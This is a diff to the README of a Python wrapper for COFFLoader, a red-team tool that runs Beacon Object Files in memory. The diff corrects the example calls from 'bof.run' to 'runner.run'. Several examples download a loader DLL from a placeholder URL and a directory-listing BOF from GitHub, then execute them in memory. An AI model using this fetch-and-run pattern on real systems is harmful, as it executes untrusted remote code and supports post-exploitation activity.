@@ -24,7 +24,7 @@ import bof
 coffldr = open(r'c:\path\to\COFFLoader.dll', 'rb').read()
 runner = bof.BOF(coffldr)
 data = open(r'c:\path\to\example.o', 'rb').read()
-bof.run(data)
+runner.run(data)
 ```
 
 ### Pass a raw string argument into BOF
@@ -33,7 +33,7 @@ import bof
 coffldr = open(r'c:\path\to\COFFLoader.dll', 'rb').read()
 runner = bof.BOF(coffldr)
 data = open(r'c:\path\to\example.o', 'rb').read()
-bof.run(data, args=["foo"], raw=True)
+runner.run(data, args=["foo"], raw=True)
 # Raw cannot be used with function kwarg
 ```
 
@@ -43,7 +43,7 @@ import bof
 coffldr = open(r'c:\path\to\COFFLoader.dll', 'rb').read()
 runner = bof.BOF(coffldr)
 data = open(r'c:\path\to\example.o', 'rb').read()
-bof.run(data, args=[r"c:\users"], format="w")
+runner.run(data, args=[r"c:\users"], format="w")
 ```
 
 ## Practical example of execution
@@ -53,7 +53,7 @@ from urllib.request import urlopen
 coffldr = urlopen('http://mysite/path/to/COFFLoader.dll', 'rb').read()
 runner = bof.BOF(coffldr)
 data = urlopen("https://github.com/trustedsec/CS-Situational-Awareness-BOF/raw/master/SA/dir/dir.x64.o").read()
-bof.run(data, args=[r"c:\users"], format="w")
+runner.run(data, args=[r"c:\users"], format="w")
 ```
 
 ## Args/Kwargs
@@ -105,7 +105,7 @@ python
 >>> coffldr = urlopen('http://mysite/path/to/COFFLoader.dll', 'rb').read()
 >>> runner = bof.BOF(coffldr)
 >>> data = urlopen("https://github.com/trustedsec/CS-Situational-Awareness-BOF/raw/master/SA/dir/dir.x64.o").read()
->>> bof.run(data, args=[r"c:\users"], format="w")
+>>> runner.run(data, args=[r"c:\users"], format="w")
 ```
 
 ## Gotchas
